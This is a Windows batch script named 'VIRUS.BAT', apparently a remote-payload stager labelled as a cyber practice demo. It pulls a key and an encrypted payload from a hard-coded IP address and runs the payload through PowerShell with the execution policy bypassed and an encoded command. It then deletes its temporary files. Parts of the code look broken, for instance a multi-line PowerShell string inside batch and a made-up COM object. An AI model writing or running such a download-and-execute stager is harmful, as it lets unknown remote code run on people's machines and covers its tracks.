@echo off
REM 🔥 VIRUS.BAT - FUNCIONA CON TU API EXACTA
title CiberDemo DEBUG
color 0A

echo =====================================================
echo 🔥 CYBER PRÁCTICA - DEBUG COMPLETO
echo =====================================================
echo PC: %COMPUTERNAME% ^| %TIME%
echo.

REM 1. LOG
set LOG=%TEMP%\Cyber_%RANDOM%.log
echo [%TIME%] INICIO >!%LOG!

REM 2. TIMESTAMP UNIX CORRECTO
powershell -Command "$ts=[math]::Round((Get-Date).ToUniversalTime().Subtract((New-Object DateTime 1970,1,1)).TotalSeconds); Write-Output $ts" > %TEMP%\ts.txt
set /p TS=<%TEMP%\ts.txt
echo [1/6] TS Unix: %TS%

REM 3. AUTH KEY
echo [2/6] 🔑 Auth...
curl -s "http://82.29.153.101:8080/auth/key?ts=%TS%" > %TEMP%\auth.enc
if errorlevel 1 goto :error_auth
for %%a in (%TEMP%\auth.enc) do set ASIZE=%%~za
echo ✓ Auth OK (%ASIZE% bytes)

REM 4. PAYLOAD KEY
powershell -Command "
$salt='CyberDefense2024_FixedSalt_32charsExactly!!%TS%';
$hash=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($salt));
$tempKeyRaw=$hash[0..31];
$tempKey=[Convert]::ToBase64String($tempKeyRaw);
Add-Type -AssemblyName System.Security;
$key=[Convert]::FromBase64String((Get-Content '%TEMP%\auth.enc' -Encoding Byte -Raw));
$cipher=New-Object -ComObject 'Fernet.Fernet' -ArgumentList @($tempKey) -ErrorAction Stop;
$payloadKey=[System.Security.Cryptography.SHA256]::Create().ComputeHash($key+$tempKeyRaw) | ForEach-Object { $_.ToString('x2') } | Join-String -Separator '' | Select-Object -First 44;
Write-Output $payloadKey
" > %TEMP%\payload_key.txt
set /p PAYLOAD_KEY=<%TEMP%\payload_key.txt
echo [3/6] Key: %PAYLOAD_KEY:~0,12%...

REM 5. DOWNLOAD
echo [4/6] 📥 Payload...
curl -s -H "X-Decrypt-Key: %PAYLOAD_KEY%" "http://82.29.153.101:8080/payload/encrypted" > %TEMP%\payload.enc
for %%b in (%TEMP%\payload.enc) do set PSIZE=%%~zb
if %PSIZE% lss 100 (
    echo ❌ Payload vacío!
    goto :error_payload
)
echo ✓ Payload (%PSIZE% bytes)

REM 6. EJECUTAR
echo [5/6] ▶️ Ejecutando...
powershell -WindowStyle Normal -ExecutionPolicy Bypass -EncodedCommand (Get-Content %TEMP%\payload.enc -Raw | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)) })
echo.

REM 7. CHECK
echo [6/6] Verificando...
if exist "%PUBLIC%\Desktop\SystemDiagnostic.log" (
    echo ✓ ✓ ÉXITO ✓ ✓
    type "%PUBLIC%\Desktop\SystemDiagnostic.log"
) else (
    echo ⚠️ Sin marker
)

REM CLEANUP
echo 🧹 Limpiando...
del %TEMP%\ts.txt %TEMP%\auth.enc %TEMP%\payload_key.txt %TEMP%\payload.enc >nul 2>&1
echo ✅ Limpio
echo Log: %LOG%
start %TEMP%
pause
goto :eof

:error_auth
echo ❌ Auth 401 - TS expiró
echo FIX: Ejecuta de nuevo (10min ventana)
pause
exit /b 1

:error_payload
echo ❌ Payload inválido
pause
exit /b 1